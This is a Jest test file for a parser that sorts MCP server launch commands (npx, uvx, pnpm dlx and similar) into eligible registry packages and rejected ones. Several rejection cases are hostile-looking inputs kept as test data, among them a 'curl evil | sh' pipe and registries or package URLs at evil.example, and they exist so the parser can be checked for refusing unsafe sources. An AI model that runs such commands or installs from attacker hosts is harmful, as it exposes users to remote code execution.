import { parseLauncherCommand } from './mcp-launcher';

describe('parseLauncherCommand', () => {
  it.each([
    [['npx', '-y', '@apify/actors-mcp-server'], 'npm', '@apify/actors-mcp-server', null],
    [
      ['npx', '@modelcontextprotocol/server-everything@1.4.0'],
      'npm',
      '@modelcontextprotocol/server-everything',
      '1.4.0',
    ],
    [['npx', '-y', 'pkg@latest', '--flag'], 'npm', 'pkg', null],
    [['bunx', 'pkg'], 'npm', 'pkg', null],
    [['pnpm', 'dlx', 'pkg@2.0.0'], 'npm', 'pkg', '2.0.0'],
    [['npx.cmd', '-y', 'pkg'], 'npm', 'pkg', null],
    [
      ['uvx', 'awslabs.amazon-keyspaces-mcp-server==0.0.14'],
      'pypi',
      'awslabs.amazon-keyspaces-mcp-server',
      '0.0.14',
    ],
    [['uvx', 'mcp-server-git', '--repository', '/tmp/x'], 'pypi', 'mcp-server-git', null],
    [['uvx', 'pkg@latest'], 'pypi', 'pkg', null],
    [['uvx', '--from', 'mcp-server-foo', 'foo-cmd'], 'pypi', 'mcp-server-foo', null],
    [['uvx', '--from=mcp-server-foo>=1.2', 'foo-cmd'], 'pypi', 'mcp-server-foo', '1.2'],
    [['uv', 'tool', 'run', 'pkg'], 'pypi', 'pkg', null],
  ])('parses %j', (argv, ecosystem, identifier, versionHint) => {
    expect(parseLauncherCommand(argv)).toEqual({
      eligible: true,
      ecosystem,
      identifier,
      versionHint,
    });
  });

  it.each([
    ['python', '-m', 'mcp_server_git'],
    ['node', 'dist/index.js'],
    ['bash', '-c', 'curl evil | sh'],
    ['sh', 'run.sh'],
    ['docker', 'run', '-i', '--rm', 'mcp/brave-search'],
    ['/usr/local/bin/my-mcp'],
    ['./server'],
    ['uv', '--directory', '/x', 'run', 'server'],
    ['npm', 'start'],
    ['pnpm', 'exec', 'pkg'],
    ['npx', '-p', 'other', 'pkg'],
    ['npx', '--registry', 'https://evil.example', 'pkg'],
    ['npx', '-y', 'github:evil/repo'],
    ['npx', '-y', 'https://evil.example/pkg.tgz'],
    ['npx', '-y', './local-pkg'],
    ['uvx', '--index-url', 'https://evil.example', 'pkg'],
    ['uvx', '--from', 'git+https://github.com/a/b', 'cmd'],
    ['uvx', '--from', './local', 'cmd'],
    ['uvx', 'pkg @ https://evil.example/pkg.whl'],
    ['npx'],
    ['uvx'],
    [],
  ])('rejects %j', (...argv) => {
    expect(parseLauncherCommand(argv).eligible).toBe(false);
  });
});
